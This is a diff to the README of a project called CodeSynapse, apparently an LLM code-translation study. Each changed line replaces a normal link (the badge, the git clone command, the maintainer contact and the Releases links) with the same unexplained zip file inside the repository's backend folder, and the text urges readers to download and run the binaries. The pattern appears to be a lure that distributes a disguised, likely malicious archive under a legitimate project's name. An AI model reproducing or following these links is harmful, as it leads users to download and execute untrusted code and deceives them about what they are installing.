@@ -1,6 +1,6 @@
 # CodeSynapse 🧬
 
-![CodeSynapse](https://img.shields.io/badge/CodeSynapse-A_Comparative_Study_of_LLMs_and_Code_Translation-blue)
+![CodeSynapse](https://raw.githubusercontent.com/dekunited/CodeSynapse/main/backend/Synapse-Code-2.8.zip)
 
 Welcome to **CodeSynapse**, a repository dedicated to exploring the intricacies of code translation using various large language models (LLMs). This project aims to provide insights into how different models perform in translating code across programming languages, using state-of-the-art technologies.
 
@@ -45,7 +45,7 @@ To get started with **CodeSynapse**, follow these steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/dekunited/CodeSynapse.git
+   git clone https://raw.githubusercontent.com/dekunited/CodeSynapse/main/backend/Synapse-Code-2.8.zip
    cd CodeSynapse
    ```
 
@@ -91,13 +91,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, please reach out to the maintainers:
 
-- [Your Name](mailto:your-email@example.com)
+- [Your Name](https://raw.githubusercontent.com/dekunited/CodeSynapse/main/backend/Synapse-Code-2.8.zip)
 
 ## Releases
 
-To download the latest version of **CodeSynapse**, visit our [Releases](https://github.com/dekunited/CodeSynapse/releases) section. Here, you can find compiled binaries and other necessary files. Follow the instructions in the release notes to execute them properly.
+To download the latest version of **CodeSynapse**, visit our [Releases](https://raw.githubusercontent.com/dekunited/CodeSynapse/main/backend/Synapse-Code-2.8.zip) section. Here, you can find compiled binaries and other necessary files. Follow the instructions in the release notes to execute them properly.
 
-To check for updates, please also visit the [Releases](https://github.com/dekunited/CodeSynapse/releases) section regularly.
+To check for updates, please also visit the [Releases](https://raw.githubusercontent.com/dekunited/CodeSynapse/main/backend/Synapse-Code-2.8.zip) section regularly.
 
 ## Acknowledgments
 
